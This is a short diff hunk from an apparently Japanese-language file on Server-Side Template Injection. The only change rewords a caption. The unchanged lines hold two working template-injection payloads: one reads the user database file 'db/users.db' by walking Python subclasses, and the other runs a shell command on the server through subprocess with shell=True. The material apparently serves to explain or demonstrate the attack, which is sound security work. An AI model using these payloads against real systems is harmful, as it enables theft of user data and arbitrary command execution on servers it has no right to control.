@@ -7,7 +7,7 @@ Server-Side Template Injection (SSTI)
 あるいは：
 {{ ''.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('db/users.db', 'rb').read() }}
 
-サーバーのディレクトリーのファイル一覧を表示するコマンド：
+サーバーのルートディレクトリーのファイルの一覧を表示させるペイロード：
 {{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('dir', stderr=request.application.__globals__.__builtins__.__import__('subprocess').STDOUT, shell=True).decode() }}
 """
 
